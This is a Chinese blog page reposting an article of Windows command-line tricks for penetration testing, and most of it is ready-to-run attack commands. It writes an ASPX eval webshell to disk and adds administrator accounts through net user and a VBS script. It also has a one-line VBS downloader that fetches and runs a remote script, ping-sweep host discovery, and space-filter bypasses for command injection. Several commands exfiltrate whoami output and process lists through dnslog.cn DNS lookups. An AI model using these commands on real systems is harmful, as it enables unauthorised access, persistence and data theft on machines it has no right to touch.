<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.8.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <meta name="description" content="Windows命令行下常用渗透技巧原创 3had0w 潇湘信安;) 潇湘信安 微信号 xxxasec 0x01 前言 渗透测试中无论是打点，还是后渗透，多多少少都会用到命令行下的一些技巧以达到快速拿到目标主机权限和绕过一些安全防护功能等。其实在cmd和powershell下只要灵活运用就能满足大部分渗透需求，主要还是看你遇到什么样的场景，需要完成什么需求，达到什么样的效果？ 当然，这里笔者也只是将">
<meta property="og:type" content="article">
<meta property="og:title" content="A1LB1ue">
<meta property="og:url" content="http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/index.html">
<meta property="og:site_name" content="A1LB1ue">
<meta property="og:description" content="Windows命令行下常用渗透技巧原创 3had0w 潇湘信安;) 潇湘信安 微信号 xxxasec 0x01 前言 渗透测试中无论是打点，还是后渗透，多多少少都会用到命令行下的一些技巧以达到快速拿到目标主机权限和绕过一些安全防护功能等。其实在cmd和powershell下只要灵活运用就能满足大部分渗透需求，主要还是看你遇到什么样的场景，需要完成什么需求，达到什么样的效果？ 当然，这里笔者也只是将">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDjzjIQgDD4wUBR0WkSx8HQjfYK1mRJfibGBGibXwMmibpyFHukKG79IaDw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDicicznECspY47EVW5QeNSfc4yRPntwOiazH0VHxF3AxQZECzqHXcQO1EQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDo1SptPLDD7mo4ZGfprOHNTaf9NhNyfdFIh5qsQEqS5qpzZX6qJicBPQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDzqYMnLScoliaVVYMNk2QYpz4CMLdORptricCT97icEibuHDbprpepV82Gg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDib39RkbOOmdGfHIJpaBY4kSpMicn5kaaPJAPo2Mr6zHWKzSX4Gq6ZL5g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDrOJuttJ63pboRxreOEsDt5oiaJk3zlucNYOjr5JB4H1boC2PxTZOJOw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDuoosibYdBV5SibdYgh20nibsSiavjSIalUgSQiaGQ9HLfAN22sWORhekxIQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDibe9Vvibia5PH4f0mBVooia3rIibBKh8fYvBibALCcNx7BwLZX7NoSF7BydA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGD17guzFGg6z4r9SZUA6a1MNyfcatOPyxRqrOuIDlBhTDG6nk8RzMzEw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDuz92w6k2Io1ibpWon5W4jTUj4icC8gSNU96Xw9s8U5aZfjzA8XAlM6Bg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGD9ib59TnTzlWyRQPxSmbQia4PWEZWzlmjvUjglZ4KFc3dJgB64Qz5OLqA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDRAjK2jJzr32sc6mw2aUAaukyBQZ6YguHTaUs98xicRCAl1mYLdNtXPQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDVL12iaNUgUOUOOrfvU04MLqOSyRViayETdpfGKRCCZ3bYDY4HEhanib5Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGD5Nkm5yAdVOGxsbTY6FCnXdmr51AtNS9ru4tVPzEjnYNiaTPdyVeFFpQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDX1vq27Fic9Wm6LKLrEQC4jicHRxDgHbK1dboUPGCqic9eZKgGavDKCIRw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="http://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6YLhRjHMxGMsH55CSVdlMC0XEwtoAQI06hia8rd371BcDnQ8bfRmP4YqA/0?wx_fmt=png">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOec0rlHvusMpuZ14HCT4dZn9ZdY1H6uNgSDcvJmovZibZVy4FV2kEib6nJ9SASN1b4Es56KdPsHWibKg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcIJDWu9lMmvjKulJ1TxiavKVzyum8jfLVjSYI21rq57uueQafg0LSTCA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="http://allblue147.github.io/s/data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==">
<meta property="og:updated_time" content="2021-11-26T06:56:25.199Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="A1LB1ue">
<meta name="twitter:description" content="Windows命令行下常用渗透技巧原创 3had0w 潇湘信安;) 潇湘信安 微信号 xxxasec 0x01 前言 渗透测试中无论是打点，还是后渗透，多多少少都会用到命令行下的一些技巧以达到快速拿到目标主机权限和绕过一些安全防护功能等。其实在cmd和powershell下只要灵活运用就能满足大部分渗透需求，主要还是看你遇到什么样的场景，需要完成什么需求，达到什么样的效果？ 当然，这里笔者也只是将">
<meta name="twitter:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDjzjIQgDD4wUBR0WkSx8HQjfYK1mRJfibGBGibXwMmibpyFHukKG79IaDw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>A1LB1ue</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
</head>

<script type="text/javascript" src="../source/js/love.js"></script>
<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/projects_url">项目</a></li>
        
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇 " href="/2021/11/28/某泛微 E-Office v9 被捕获的任意文件上传漏洞分析/1/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇 " href="/2021/11/10/RCE写shell总结/RCE写shell姿势总结/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows命令行下常用渗透技巧"><span class="toc-number">1.</span> <span class="toc-text">Windows命令行下常用渗透技巧</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">JYP</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-11-26T06:44:12.814Z" itemprop="datePublished">2021-11-26</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Windows命令行下常用渗透技巧"><a href="#Windows命令行下常用渗透技巧" class="headerlink" title="Windows命令行下常用渗透技巧"></a>Windows命令行下常用渗透技巧</h1><p>原创 3had0w <a href="javascript:void(0" target="_blank" rel="noopener">潇湘信安</a>;)</p>
<p><strong>潇湘信安</strong></p>
<p>微信号 xxxasec</p>
<p><strong>0x01 前言</strong></p>
<p>渗透测试中无论是打点，还是后渗透，多多少少都会用到命令行下的一些技巧以达到快速拿到目标主机权限和绕过一些安全防护功能等。其实在cmd和powershell下只要灵活运用就能满足大部分渗透需求，主要还是看你遇到什么样的场景，需要完成什么需求，达到什么样的效果？</p>
<p>当然，这里笔者也只是将以前自己常用到的，以及在看各位师傅文章中学到的技巧搜集整理在一起分享给大家，希望对大家能有所帮忙，有时间再做补充，也期待各位师傅的补充！！！如有错误，还望指出！！！<img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDjzjIQgDD4wUBR0WkSx8HQjfYK1mRJfibGBGibXwMmibpyFHukKG79IaDw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><strong>0x02 利用|/&amp;管道符执行多条命令</strong></p>
<p><strong>应用场景：</strong>常用于查找远程桌面端口号、异常网络连接以及添加管理员用户等。  </p>
<pre><code>netstat -ano | findstr &quot;ESTABLISHED&quot;
net user 90sec 123456 /ad &amp; net localgroup administrators 90sec /ad
</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDicicznECspY47EVW5QeNSfc4yRPntwOiazH0VHxF3AxQZECzqHXcQO1EQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><strong><strong>0x03 利用^转义符解决&lt;&gt;字符问题</strong></strong></p>
<p><strong>应用场景：</strong>常用于写入Webshell木马文件时对&lt;&gt;、&amp;等特殊字符的转义，不加写不了。  </p>
<pre><code>echo ^&lt;%@Page Language=&quot;Jscript&quot; validateRequest=&quot;false&quot;%^&gt;^&lt;%Response.Write(eval(Request.Item[&quot;w&quot;],&quot;unsafe&quot;));%^&gt; &gt; c:\Users\3had0w\Desktop\ok.aspx
</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDo1SptPLDD7mo4ZGfprOHNTaf9NhNyfdFIh5qsQEqS5qpzZX6qJicBPQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><strong>0x04 利用dir/for等命令查找网站路径</strong></p>
<p><strong>应用场景：</strong>常用于内网信息搜集查找铭感文件和内容，也可根据文件名、扩展以及内容来查找文件所在位置绝对路径，如：1.网站路径和数据库连接文件、2.被黑灰产修改过的（跳转）脚本文件等。  </p>
<pre><code>dir /a/b/s D:\web\*.asp
where /r D:\web\ *.php *.asp
for /r D:\web\ %i in (*.php *.asp) do @echo %i
%windir%\system32\inetsrv\appcmd list VDIR

findstr /n /s /i &quot;uid=sa&quot; E:\ftp_bak\*.config
findstr /n /s /i &quot;DB_PWD&quot; D:\www\*.php
</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDzqYMnLScoliaVVYMNk2QYpz4CMLdORptricCT97icEibuHDbprpepV82Gg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDib39RkbOOmdGfHIJpaBY4kSpMicn5kaaPJAPo2Mr6zHWKzSX4Gq6ZL5g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><strong>0x05 利用:冒号将VBS脚本代码写在一行</strong></p>
<p><strong>应用场景：</strong>常用于命令行下写入Webshell木马、VBS添加用户、下载者等恶意脚本，&gt;创建，&gt;&gt;叠加，注意2、4、8、9行中的&amp;管道符，也要用^转义下才能正常写入。</p>
<pre><code>echo set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;) &gt; C:\adduser.vbs
echo os=&quot;WinNT://&quot;^&amp;wsnetwork.ComputerName &gt;&gt; C:\adduser.vbs
echo Set ob=GetObject(os) &gt;&gt; C:\adduser.vbs
echo Set oe=GetObject(os^&amp;&quot;/Administrators,group&quot;) &gt;&gt; C:\adduser.vbs
echo Set od=ob.Create(&quot;user&quot;,&quot;betasec&quot;) &gt;&gt; C:\adduser.vbs
echo od.SetPassword &quot;pass!@#!23&quot; &gt;&gt; C:\adduser.vbs
echo od.SetInfo &gt;&gt; C:\adduser.vbs
echo Set of=GetObject(os^&amp;&quot;/betasec&quot;,user) &gt;&gt; C:\adduser.vbs
echo oe.add os^&amp;&quot;/betasec&quot; &gt;&gt; C:\adduser.vbs
</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDrOJuttJ63pboRxreOEsDt5oiaJk3zlucNYOjr5JB4H1boC2PxTZOJOw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><strong>0x06 利用&gt;/&gt;&gt;重定向符叠加写入VBS</strong></p>
<p><strong>应用场景：</strong>常用于MSSQL高权限注入点写入VBS脚本文件，一行一行写过于繁琐。VBScript可以在一行代码内同时对两个变量进行赋值，中间用冒号分隔即可，脚本可正常执行。</p>
<pre><code>echo Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;):Set Shell = CreateObject(&quot;Wscript.Shell&quot;):Post.Open &quot;GET&quot;,&quot;http://127.0.0.1/adduser.txt&quot;,0 :Post.Send():Set aGet = CreateObject(&quot;ADODB.Stream&quot;):aGet.Mode = 3:aGet.Type = 1:aGet.Open():aGet.Write(Post.responseBody):aGet.SaveToFile &quot;c:\adduser.vbs&quot;,2:wscript.sleep 1000:Shell.Run (&quot;c:\adduser.vbs&quot;) &gt; c:\down.vbs
</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDuoosibYdBV5SibdYgh20nibsSiavjSIalUgSQiaGQ9HLfAN22sWORhekxIQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><strong>0x07 利用for命令探测工作组/域存活主机</strong></p>
<p><strong>应用场景：</strong>常用于探测工作组和域内存活主机，用的是Ping命令，基于ICMP协议，但如果禁Ping时该方法则无效，利用此方法在实际应用中可能需要做少许修改：内网IP或网段。</p>
<p><strong>直接在命令终端回显：</strong></p>
<pre><code>@for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | findstr /i &quot;ttl=&quot;
</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDibe9Vvibia5PH4f0mBVooia3rIibBKh8fYvBibALCcNx7BwLZX7NoSF7BydA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><strong>将存活主机写入到文件：</strong></p>
<pre><code>@for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | findstr /i &quot;ttl=&quot; &gt;nul &amp; if errorlevel 1 (echo 192.168.1.%i May be sleeping ! &gt;&gt; result.txt) else (echo 192.168.1.%i is alive ! &gt;&gt; result.txt)

查看扫描后的存活主机：
type result.txt | findstr &quot;alive&quot;
</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGD17guzFGg6z4r9SZUA6a1MNyfcatOPyxRqrOuIDlBhTDG6nk8RzMzEw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><strong>工作组/域内存活主机探测：</strong></p>
<p>这个批处理文件可用于对内网工作组和域内存活主机进行简单的扫描探测，并且支持中英文操作系统。</p>
<pre><code>@echo off
@echo.
@FOR /F &quot;usebackq delims=, &quot; %%J IN (`net view /domain ^|find &quot;命令成功完成&quot; /v ^|find &quot;The command completed successfully.&quot; /v ^|find &quot;命令成功完成&quot; /v ^|find &quot;--&quot; /v ^|find &quot;Domain&quot; /v ^|find &quot;&quot; /v ^|find &quot;コマンドは正常に終了しました&quot; /v /i`) do (
@echo ====== Domain:%%J =========
@FOR /F &quot;usebackq eol=; delims=, &quot; %%i in (`net view /domain:%%J ^|findstr &quot;\\&quot;`) do (
@FOR /F &quot;usebackq eol=; tokens=1,2,3* delims=\\&quot; %%a in (`@echo %%i`) do (
ping %%a -4 -n 1 -w 100 |find /i &quot;ping&quot; &gt; %%a.txt
@FOR /F &quot;tokens=2 delims=[]&quot; %%b in (%%a.txt) do @echo \\%%a = [%%b]
@del /f /q %%a.txt
)))
@echo ====== Getting IP Complete ======
</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDuz92w6k2Io1ibpWon5W4jTUj4icC8gSNU96Xw9s8U5aZfjzA8XAlM6Bg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><strong>0x08 利用符号或者环境变量截取绕过空格</strong></p>
<p><strong>应用场景：</strong>常用于命令执行漏洞绕过，在代码层面或安全防护中过滤了空格，也就是在执行命令时不能带有空格，最近几天在几个群里都看到有人讨论这个问题，也属常见问题。</p>
<p><strong>特殊符号：<a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&amp;mid=2247491624&amp;idx=1&amp;sn=6ba97c2d5485fb668c074db3985bb7f9&amp;chksm=cfa5443bf8d2cd2d4be615b26f9275b5617563013258cf7092021167c9e434320913ab30b7f0&amp;scene=21 textvalue=" target="_blank" rel="noopener">记一次“上传”命令执行的绕过案例</a></strong></p>
<pre><code>echo.123&gt;&gt;a.txt
echo,123&gt;&gt;a.txt
type;a.txt
[...SNIP...]

&amp;cd;..&amp;cd;..&amp;cd;windows&amp;cd;system32
&amp;cd;..&amp;cd;1631359215&amp;cs.jpg&amp;.jpg
[...SNIP...]
</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGD9ib59TnTzlWyRQPxSmbQia4PWEZWzlmjvUjglZ4KFc3dJgB64Qz5OLqA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><strong>环境变量：<a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&amp;mid=2247485655&amp;idx=1&amp;sn=229537b3ce9e7927178eec9882d69168&amp;chksm=cfa6acc4f8d125d22fd063f6e80c7c6751e3c5ecea568b59f45d1a60591b4f4cd208ab6dc6a2&amp;scene=21 textvalue=" target="_blank" rel="noopener">命令注入靶场空格过滤绕过测试</a></strong></p>
<pre><code>%path:~10,1%
%programfiles:~10,1%
%processor_identifier:~7,1%
%commonprogramw6432:~10,1%
%commonprogramfiles(x86):~10,1%
%commonprogramfiles:~10,1%
%commonprogramfiles:~10,-18%
%commonprogramfiles:~23,1%
%fps_browser_app_profile_string:~8,1%
[...SNIP...]
</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDRAjK2jJzr32sc6mw2aUAaukyBQZ6YguHTaUs98xicRCAl1mYLdNtXPQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><strong>0x09 利用dnslog查看注入点执行命令结果</strong></p>
<p><strong>应用场景：</strong>常用于探测目标主机的DNS协议是否能够出网，或者是在高权限注入无回显时也可以通过dnslog来将命令执行结果带出，如：查看当前用户和进程列表等。</p>
<p><strong>探测DNS出网状态：</strong></p>
<pre><code>ping ******.dnslog.cn
nslookup ******.dnslog.cn
&lt;?php gethostbyname(&quot;******.dnslog.cn&quot;);?&gt;
</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDVL12iaNUgUOUOOrfvU04MLqOSyRViayETdpfGKRCCZ3bYDY4HEhanib5Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><strong>查询当前用户权限：</strong></p>
<pre><code>for /F %i in (&apos;whoami&apos;) do nslookup %i.lr5dyr.dnslog.cn

cmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.ly9hvm.dnslog.cn &amp;&amp; nslookup !FINAL!&quot; &amp;&amp; del temp*
</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGD5Nkm5yAdVOGxsbTY6FCnXdmr51AtNS9ru4tVPzEjnYNiaTPdyVeFFpQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><strong>0x10 利用dnslog查看目标主机的杀毒软件</strong></p>
<p><strong>应用场景：</strong>用于MSSQL高权限注入，目标主机不出网，但想利用dnslog探测主机中是否有杀软？两种方法原理一样，都是先获取进程列表，然后for、ForEach循环Ping、nslookup通过dnslog带出来。</p>
<pre><code>for /F %i in (&apos;wmic process get Name ^| findstr &quot;.exe&quot;&apos;) do ping -n 1 %i.******.dnslog.cn &gt;nul

powershell -c &quot;Get-Process | select processname &gt; 1.txt&quot;
powershell -c &quot;Get-Content .\1.txt | Sort-Object -Unique | ForEach-Object {if($_ -match $regex){$b=$_.trim();ping -n 1 $b&apos;.***fks2j.ns.dns3.cf.&apos;} }&quot;
</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDX1vq27Fic9Wm6LKLrEQC4jicHRxDgHbK1dboUPGCqic9eZKgGavDKCIRw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<hr>
